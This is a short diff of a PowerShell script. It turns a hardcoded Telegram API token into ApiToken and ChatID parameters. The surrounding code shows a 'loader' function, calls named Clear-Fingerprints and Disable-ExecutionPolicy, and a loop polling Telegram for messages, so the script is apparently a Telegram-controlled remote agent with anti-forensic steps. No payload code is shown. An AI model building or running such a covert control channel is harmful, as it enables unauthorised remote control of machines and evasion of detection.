@@ -1,3 +1,8 @@
+param(
+        [Parameter(Mandatory)][String] $ApiToken,
+        [Parameter(Mandatory)][String] $ChatID
+    )
+    
 function loader{    # aqui empieza la funcion loader
     param(
         [Parameter(Mandatory)]
@@ -41,9 +46,7 @@ $GLOBAL:joblist=@{}
 Clear-Fingerprints
 Disable-ExecutionPolicy
 
-$API_TOKEN = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
-
-New-MyTelegramConfiguration -ApiToken $API_TOKEN
+New-MyTelegramConfiguration -ApiToken $ApiToken -ChatID $ChatID
 
 while($condition){
     $telegrams = Get-TelegramTimeLine -MaxinumMessages 1
